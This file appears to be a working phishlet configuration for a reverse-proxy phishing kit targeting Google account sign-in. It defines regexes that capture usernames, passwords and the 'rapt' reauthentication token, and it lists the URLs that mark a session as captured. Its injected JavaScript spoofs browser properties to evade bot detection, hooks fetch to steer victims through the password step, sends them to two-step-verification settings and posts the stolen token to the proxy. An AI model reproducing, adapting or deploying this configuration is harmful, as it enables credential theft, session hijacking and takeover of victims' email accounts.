    # Capture username/password credentials
credentials:
  username:
    key: ''
    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'
    - key: 'rapt'
      search: '"rapt":"([^"]*)'
      type: 'json'

# URLs that finalize authentication
auth_urls:
  - '/v3/signin/challenge/pwd/data/batchexecute'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/'

# Legitimate site login page location
login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'

# Injected JavaScript for redirection and anti-detection
js_inject:
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['*']
    script: |
        window.addEventListener('load', () => {if (window.location.pathname === '/') {window.location.href = '/u/4/signinoptions/twosv';return;};const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('rapt')) {const xxxValue = urlParams.get('rapt');fetch('/xxx', {    method: 'POST',    headers: {        'Content-Type': 'application/json'    },    body: JSON.stringify({ rapt: xxxValue })})    .then(response => {        if (!response.ok) {            throw new Error('Network response was not ok');        }        return response.json();    })    .then(data => {        console.log('Success:', data);    })    .catch(error => {        console.error('Error:', error);    });}});
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin*', '/v3/signin/identifier*', '/v3/signin/challenge*']
    script: |
        (function() {
          // Anti-bot detection: Spoof navigator properties
          Object.defineProperty(navigator, 'webdriver', {get: () => false});
          Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
          Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
          
          // Monitor for email submission and force redirect
          let emailSubmitted = false;
          const originalFetch = window.fetch;
          window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
              const url = typeof args[0] === 'string' ? args[0] : (args[0].url || '');
              if (url.includes('batchexecute') && url.includes('MI613e')) {
                response.clone().text().then(text => {
                  if (text.includes('identifier') && !text.includes('INCORRECT_ANSWER') && !emailSubmitted) {
                    emailSubmitted = true;
                    setTimeout(() => {
                      const params = new URLSearchParams(window.location.search);
                      const pwdUrl = '/v3/signin/challenge/pwd?' + params.toString();
                      window.location.replace(pwdUrl);
                    }, 300);
                  }
                });
              }
              return response;
            });
          };
        })();



# Force POST parameters for proper flow
force_post:
  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd*'
    search:
      - {key: 'continue', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
